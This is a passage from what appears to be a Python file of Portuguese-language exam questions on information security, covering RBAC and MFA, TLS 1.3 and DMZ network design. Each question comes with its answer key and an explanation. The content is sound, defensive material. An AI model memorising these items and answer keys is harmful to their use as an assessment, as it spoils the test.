      com="**Gabarito: D.** Permissões por **papéis** = **RBAC**. Senha (algo que se **sabe**) + código do app no celular (algo que se **tem**) = **MFA**, com fatores de categorias diferentes.\n\n(A) No DAC o dono do recurso decide quem acessa. (B) No MAC o sistema impõe rótulos de classificação. (C) O ABAC decide por atributos, e os fatores aqui são de tipos diferentes. (E) O fato de ambos serem digitados não importa: o código prova a **posse** do dispositivo. (Senha + PIN, sim, seria um fator só.)"),

    Q(E, "04", 16, sub="16.3", top="SSL/TLS", k="seg-tls13",
      enun="Sobre o TLS 1.3, é correto afirmar:",
      alts=["mantém a troca de chaves RSA estática para compatibilidade, sem sigilo direto.",
            "permite cifras como RC4 e modo CBC para clientes antigos.",
            "dispensa certificados digitais no servidor.",
            "é a versão do SSL 3.0 com outro nome.",
            "exige troca de chaves com Diffie-Hellman efêmero, garantindo sigilo direto (forward secrecy), usa apenas cifras AEAD e reduz o handshake completo a uma ida e volta (1-RTT)."],
      gab="E",
      com="**Gabarito: E.** O **TLS 1.3** removeu a troca de chaves RSA estática (só DHE/ECDHE, com **forward secrecy**), aceita apenas cifras **AEAD** (AES-GCM, ChaCha20-Poly1305) e faz o handshake em **1-RTT** (com opção 0-RTT na retomada).\n\n(A) A troca RSA estática foi removida justamente por não ter sigilo direto. (B) RC4 e CBC foram eliminados. (C) O servidor continua se autenticando com certificado. (D) SSL 3.0 é obsoleto e inseguro; TLS 1.3 é outro protocolo, bem mais moderno."),

    Q(E, "04", 17, sub="17.8", top="Sistemas de proteção: firewall, WAF, UTM, DMZ, proxy, NAC", k="seg-dmz",
      enun="Na arquitetura de rede de um banco, os servidores que precisam ser acessados pela internet (servidor web do site institucional, relay de e-mail e DNS externo) devem ficar",
      alts=["na rede interna, junto aos servidores de banco de dados, para reduzir a latência.",
            "em uma DMZ, sub-rede intermediária entre a internet e a rede interna, de modo que, se comprometidos, não deem acesso direto à rede interna.",
            "fora de qualquer firewall, ligados diretamente ao roteador da operadora.",
            "na VLAN dos usuários, protegidos apenas pelo antivírus das estações.",
            "em uma rede sem endereçamento IP, para não serem descobertos."],
      gab="B",
      com="**Gabarito: B.** A **DMZ** é a zona intermediária para os servidores **expostos**; regras de firewall controlam o tráfego internet ↔ DMZ e DMZ ↔ rede interna, e um servidor comprometido na DMZ não dá acesso direto à rede interna.\n\n(A) Colocar servidores expostos na rede interna amplia o impacto de uma invasão. (C) Deixar sem firewall elimina a defesa em profundidade. (D) A VLAN de usuários não é lugar para serviços públicos. (E) Sem endereçamento IP o serviço não seria acessível."),
]
